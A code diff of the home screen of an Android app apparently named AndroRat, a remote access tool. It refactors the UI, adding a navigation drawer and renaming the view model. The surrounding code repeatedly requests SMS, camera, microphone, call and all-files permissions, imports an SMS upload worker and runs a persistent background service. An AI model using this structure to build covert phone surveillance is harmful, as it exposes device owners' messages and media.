@@ -18,13 +18,16 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Toast
+import androidx.activity.compose.BackHandler
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.ActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresApi
+import androidx.compose.material3.DrawerValue
+import androidx.compose.material3.rememberDrawerState
 import androidx.compose.runtime.LaunchedEffect
-import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.getValue
+import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.ui.graphics.ImageBitmap
 import androidx.compose.ui.graphics.asAndroidBitmap
 import androidx.compose.ui.platform.ComposeView
@@ -32,6 +35,7 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.activityViewModels
+import androidx.lifecycle.compose.collectAsStateWithLifecycle
 import androidx.navigation.fragment.findNavController
 import androidx.work.BackoffPolicy
 import androidx.work.ExistingPeriodicWorkPolicy
@@ -43,8 +47,7 @@ import com.ierusalem.androrat.core.services.endless_service.Actions
 import com.ierusalem.androrat.core.services.endless_service.EndlessService
 import com.ierusalem.androrat.core.services.endless_service.ServiceState
 import com.ierusalem.androrat.core.services.endless_service.getServiceState
-import com.ierusalem.androrat.features.home.domain.HomeViewModel
-import com.ierusalem.androrat.features.home.domain.Image
+import com.ierusalem.androrat.core.ui.components.AndroRatAppDrawer
 import com.ierusalem.androrat.core.ui.components.CameraPermissionTextProvider
 import com.ierusalem.androrat.core.ui.components.MusicAndAudioPermissionTextProvider
 import com.ierusalem.androrat.core.ui.components.PermissionDialog
@@ -60,6 +63,9 @@ import com.ierusalem.androrat.core.utility.log
 import com.ierusalem.androrat.core.utility.openAppSettings
 import com.ierusalem.androrat.core.worker.PermissionRequestWorker
 import com.ierusalem.androrat.core.worker.SMSUploadWorker
+import com.ierusalem.androrat.features.home.domain.HomeViewModel
+import com.ierusalem.androrat.features.home.domain.model.Image
+import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStream
@@ -68,7 +74,7 @@ import java.util.concurrent.TimeUnit
 
 class HomeFragment : Fragment() {
 
-    private val homeViewModel: HomeViewModel by activityViewModels()
+    private val viewModel: HomeViewModel by activityViewModels()
 
     private val recordAudioAndCallPhonePermissions = arrayOf(
         Manifest.permission.CALL_PHONE,
@@ -84,7 +90,7 @@ class HomeFragment : Fragment() {
     override fun onResume() {
         super.onResume()
         Constants.PERMISSIONS.forEach { permission ->
-            homeViewModel.updatePermissionState(
+            viewModel.updatePermissionState(
                 permission = permission, isGranted = ContextCompat.checkSelfPermission(
                     requireContext(),
                     permission
@@ -103,15 +109,42 @@ class HomeFragment : Fragment() {
         return ComposeView(requireContext()).apply {
             setContent {
                 val context = LocalContext.current
-                val state by homeViewModel.state.collectAsState()
-                val dialogQueue = homeViewModel.visiblePermissionDialogQueue
+                val state by viewModel.state.collectAsStateWithLifecycle()
+                val dialogQueue = viewModel.visiblePermissionDialogQueue
                 val workManager = WorkManager.getInstance(context)
+
+                val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
+                val drawerOpen by viewModel.drawerShouldBeOpened.collectAsStateWithLifecycle()
+                val scope = rememberCoroutineScope()
+
+                if (drawerOpen) {
+                    // Open drawer and reset state in VM.
+                    LaunchedEffect(Unit) {
+                        // wrap in try-finally to handle interruption whiles opening drawer
+                        try {
+                            drawerState.open()
+                        } finally {
+                            viewModel.resetOpenDrawerAction()
+                        }
+                    }
+                }
+
+                // Intercepts back navigation when the drawer is open
+                if (drawerState.isOpen) {
+                    BackHandler {
+                        scope.launch {
+                            drawerState.close()
+                        }
+                    }
+                }
+
+
 
                 val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
                     contract = ActivityResultContracts.RequestMultiplePermissions(),
                     onResult = { perms ->
                         recordAudioAndCallPhonePermissions.forEach { permission ->
-                            homeViewModel.updatePermissionState(
+                            viewModel.updatePermissionState(
                                 permission = permission,
                                 isGranted = perms[permission] == true
                             )
@@ -122,7 +155,7 @@ class HomeFragment : Fragment() {
                                     Toast.LENGTH_SHORT
                                 ).show()
                             } else {
-                                homeViewModel.onPermissionResult(
+                                viewModel.onPermissionResult(
                                     permission = permission,
                                     isGranted = false
                                 )
@@ -136,7 +169,7 @@ class HomeFragment : Fragment() {
                         contract = ActivityResultContracts.RequestMultiplePermissions(),
                         onResult = { perms ->
                             readMediaImagesAndAudioPermissions.forEach { permission ->
-                                homeViewModel.updatePermissionState(
+                                viewModel.updatePermissionState(
                                     permission = permission,
                                     isGranted = perms[permission] == true
                                 )
@@ -159,7 +192,7 @@ class HomeFragment : Fragment() {
                                         }
                                     }
                                 } else {
-                                    homeViewModel.onPermissionResult(
+                                    viewModel.onPermissionResult(
                                         permission = permission,
                                         isGranted = false
                                     )
@@ -172,7 +205,7 @@ class HomeFragment : Fragment() {
                     rememberLauncherForActivityResult(
                         contract = ActivityResultContracts.RequestPermission(),
                         onResult = { isGranted ->
-                            homeViewModel.updatePermissionState(
+                            viewModel.updatePermissionState(
                                 permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                 isGranted = isGranted
                             )
@@ -183,7 +216,7 @@ class HomeFragment : Fragment() {
                                     Toast.LENGTH_SHORT
                                 ).show()
                             } else {
-                                homeViewModel.onPermissionResult(
+                                viewModel.onPermissionResult(
                                     permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                     isGranted = false
                                 )
@@ -194,7 +227,7 @@ class HomeFragment : Fragment() {
                 val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
                     contract = ActivityResultContracts.RequestPermission(),
                     onResult = { isGranted ->
-                        homeViewModel.updatePermissionState(
+                        viewModel.updatePermissionState(
                             permission = Manifest.permission.RECORD_AUDIO,
                             isGranted = isGranted
                         )
@@ -205,7 +238,7 @@ class HomeFragment : Fragment() {
                                 Toast.LENGTH_SHORT
                             ).show()
                         } else {
-                            homeViewModel.onPermissionResult(
+                            viewModel.onPermissionResult(
                                 permission = Manifest.permission.RECORD_AUDIO,
                                 isGranted = false
                             )
@@ -216,7 +249,7 @@ class HomeFragment : Fragment() {
                 val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
                     contract = ActivityResultContracts.RequestPermission(),
                     onResult = { isGranted ->
-                        homeViewModel.updatePermissionState(
+                        viewModel.updatePermissionState(
                             permission = Manifest.permission.CAMERA,
                             isGranted = isGranted
                         )
@@ -227,7 +260,7 @@ class HomeFragment : Fragment() {
                                 Toast.LENGTH_SHORT
                             ).show()
                         } else {
-                            homeViewModel.onPermissionResult(
+                            viewModel.onPermissionResult(
                                 permission = Manifest.permission.CAMERA,
                                 isGranted = false
                             )
@@ -238,14 +271,14 @@ class HomeFragment : Fragment() {
                 val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
                     contract = ActivityResultContracts.RequestPermission(),
                     onResult = { isGranted ->
-                        homeViewModel.updatePermissionState(
+                        viewModel.updatePermissionState(
                             permission = Manifest.permission.READ_SMS,
                             isGranted = isGranted
                         )
                         if (isGranted) {
                             findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
                         } else {
-                            homeViewModel.onPermissionResult(
+                            viewModel.onPermissionResult(
                                 permission = Manifest.permission.READ_SMS,
                                 isGranted = false
                             )
@@ -254,12 +287,104 @@ class HomeFragment : Fragment() {
                 )
 
                 AndroRATTheme {
+                    AndroRatAppDrawer(
+                        drawerState = drawerState,
+                        onDrawerItemClick = {},
+                        content = {
+                            HomeScreen(
+                                state = state,
+                                onOpenMessageFragment = {
+                                    readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
+                                },
+                                onSaveScreenshotClick = {
+                                    //todo
+                                    if (state.screenshot != null) {
+                                        saveMediaToStorage(state.screenshot!!)
+                                    } else {
+                                        Toast.makeText(
+                                            requireContext(),
+                                            "Can not save!",
+                                            Toast.LENGTH_SHORT
+                                        ).show()
+                                    }
+                                },
+                                onOpenImagesAndVideos = {
+                                    findNavController().navigate(R.id.action_homeFragment_to_imageFragment)
+                                },
+                                onReadExternalStoragePermissionRequest = {
+                                    when (Build.VERSION.SDK_INT) {
+
+                                        in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
+                                            //todo check these versions
+                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
+                                                Manifest.permission.READ_EXTERNAL_STORAGE
+                                            )
+                                        }
+
+                                        in Build.VERSION_CODES.R..Build.VERSION_CODES.S_V2 -> {
+                                            if (Environment.isExternalStorageManager()) {
+                                                Toast.makeText(
+                                                    requireContext(),
+                                                    "Permission granted for ReadExternalStorage",
+                                                    Toast.LENGTH_SHORT
+                                                ).show()
+                                            } else {
+                                                Log.d("ahi3646", "onCreateView: read permission denied")
+                                                try {
+                                                    val intent = Intent()
+                                                    intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                                                    val uri = Uri.fromParts(
+                                                        "package",
+                                                        activity?.packageName,
+                                                        null
+                                                    )
+                                                    intent.setData(uri)
+                                                    startForResultLauncher.launch(intent)
+                                                } catch (e: Exception) {
+                                                    val intent = Intent()
+                                                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                                                    startForResultLauncher.launch(intent)
+                                                }
+                                            }
+                                        }
+                                        //this works in sdk 33 or higher versions
+                                        in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
+                                            //todo check these versions
+                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
+                                                readMediaImagesAndAudioPermissions
+                                            )
+                                        }
+                                    }
+                                },
+                                onMultiplePermissionRequest = {
+                                    multiplePermissionResultLauncher.launch(
+                                        recordAudioAndCallPhonePermissions
+                                    )
+                                },
+                                onRecordAudioPermissionRequest = {
+                                    recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
+                                },
+                                onCameraPermissionRequest = {
+                                    cameraResultPermissionLauncher.launch(Manifest.permission.CAMERA)
+                                },
+                                onTakeScreenShotClick = {
+                                    viewModel.updatePhoto(it)
+                                },
+                                onStartEndlessService = {
+                                    actionOnService(Actions.START)
+                                },
+                                onStopEndlessService = {
+                                    actionOnService(Actions.STOP)
+                                }
+                            )
+                        }
+                    )
                     LaunchedEffect(
                         key1 = Unit,
                         block = {
-                            val permissions = homeViewModel.state.value.permissions
+                            val permissions = viewModel.state.value.permissions
                             val notGrantedPermissions =
-                                homeViewModel.state.value.permissions.filter { (_, isGranted) ->
+                                viewModel.state.value.permissions.filter { (_, isGranted) ->
                                     !isGranted
                                 }
                             val permissionWorkRequest =
@@ -286,7 +411,7 @@ class HomeFragment : Fragment() {
                                         )
                                         if (workInfo.state == WorkInfo.State.RUNNING) {
                                             notGrantedPermissions.forEach { (permission, isGranted) ->
-                                                homeViewModel.onPermissionResult(
+                                                viewModel.onPermissionResult(
                                                     permission,
                                                     isGranted
                                                 )
@@ -361,7 +486,7 @@ class HomeFragment : Fragment() {
                                                         )
                                                     )
                                                 }
-                                                homeViewModel.updateImages(images)
+                                                viewModel.updateImages(images)
                                             }
                                         } else {
                                             Log.d("ahi3646_images", "onCreateView: not granted ")
@@ -508,49 +633,49 @@ class HomeFragment : Fragment() {
                                 isPermanentlyDeclined = !shouldShowRequestPermissionRationale(
                                     permission
                                 ),
-                                onDismiss = homeViewModel::dismissDialog,
+                                onDismiss = viewModel::dismissDialog,
                                 onOkClick = {
                                     when (permission) {
                                         Manifest.permission.READ_MEDIA_AUDIO -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                 arrayOf(permission)
                                             )
                                         }
 
                                         Manifest.permission.READ_MEDIA_IMAGES -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                 arrayOf(permission)
                                             )
                                         }
 
                                         Manifest.permission.READ_EXTERNAL_STORAGE -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                                 permission
                                             )
                                         }
 
                                         Manifest.permission.CAMERA -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             cameraResultPermissionLauncher.launch(permission)
                                         }
 
                                         Manifest.permission.READ_SMS -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             readSMSMessagesPermissionLauncher.launch(permission)
                                         }
 
                                         Manifest.permission.RECORD_AUDIO -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             multiplePermissionResultLauncher.launch(
                                                 arrayOf(permission)
                                             )
                                         }
 
                                         Manifest.permission.CALL_PHONE -> {
-                                            homeViewModel.dismissDialog()
+                                            viewModel.dismissDialog()
                                             multiplePermissionResultLauncher.launch(
                                                 arrayOf(permission)
                                             )
@@ -560,93 +685,6 @@ class HomeFragment : Fragment() {
                                 onGoToAppSettingsClick = ::openAppSettings
                             )
                         }
-
-                    HomeScreen(
-                        state = state,
-                        onOpenMessageFragment = {
-                            readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
-                        },
-                        onSaveScreenshotClick = {
-                            //todo
-                            if (state.screenshot != null) {
-                                saveMediaToStorage(state.screenshot!!)
-                            } else {
-                                Toast.makeText(
-                                    requireContext(),
-                                    "Can not save!",
-                                    Toast.LENGTH_SHORT
-                                ).show()
-                            }
-                        },
-                        onOpenImagesAndVideos = {
-                            findNavController().navigate(R.id.action_homeFragment_to_imageFragment)
-                        },
-                        onReadExternalStoragePermissionRequest = {
-                            when (Build.VERSION.SDK_INT) {
-
-                                in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
-                                    //todo check these versions
-                                    readExternalStoragePermissionUnderAndroid11Launcher.launch(
-                                        Manifest.permission.READ_EXTERNAL_STORAGE
-                                    )
-                                }
-
-                                in Build.VERSION_CODES.R..Build.VERSION_CODES.S_V2 -> {
-                                    if (Environment.isExternalStorageManager()) {
-                                        Toast.makeText(
-                                            requireContext(),
-                                            "Permission granted for ReadExternalStorage",
-                                            Toast.LENGTH_SHORT
-                                        ).show()
-                                    } else {
-                                        Log.d("ahi3646", "onCreateView: read permission denied")
-                                        try {
-                                            val intent = Intent()
-                                            intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                                            val uri = Uri.fromParts(
-                                                "package",
-                                                activity?.packageName,
-                                                null
-                                            )
-                                            intent.setData(uri)
-                                            startForResultLauncher.launch(intent)
-                                        } catch (e: Exception) {
-                                            val intent = Intent()
-                                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                                            startForResultLauncher.launch(intent)
-                                        }
-                                    }
-                                }
-                                //this works in sdk 33 or higher versions
-                                in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
-                                    //todo check these versions
-                                    readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
-                                        readMediaImagesAndAudioPermissions
-                                    )
-                                }
-                            }
-                        },
-                        onMultiplePermissionRequest = {
-                            multiplePermissionResultLauncher.launch(
-                                recordAudioAndCallPhonePermissions
-                            )
-                        },
-                        onRecordAudioPermissionRequest = {
-                            recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
-                        },
-                        onCameraPermissionRequest = {
-                            cameraResultPermissionLauncher.launch(Manifest.permission.CAMERA)
-                        },
-                        onTakeScreenShotClick = {
-                            homeViewModel.updatePhoto(it)
-                        },
-                        onStartEndlessService = {
-                            actionOnService(Actions.START)
-                        },
-                        onStopEndlessService = {
-                            actionOnService(Actions.STOP)
-                        }
-                    )
                 }
             }
         }
@@ -668,7 +706,7 @@ class HomeFragment : Fragment() {
 
     override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
         super.onViewCreated(view, savedInstanceState)
-        homeViewModel.screenNavigation.executeWithLifecycle(
+        viewModel.screenNavigation.executeWithLifecycle(
             lifecycle = viewLifecycleOwner.lifecycle,
             action = ::executeNavigation
         )
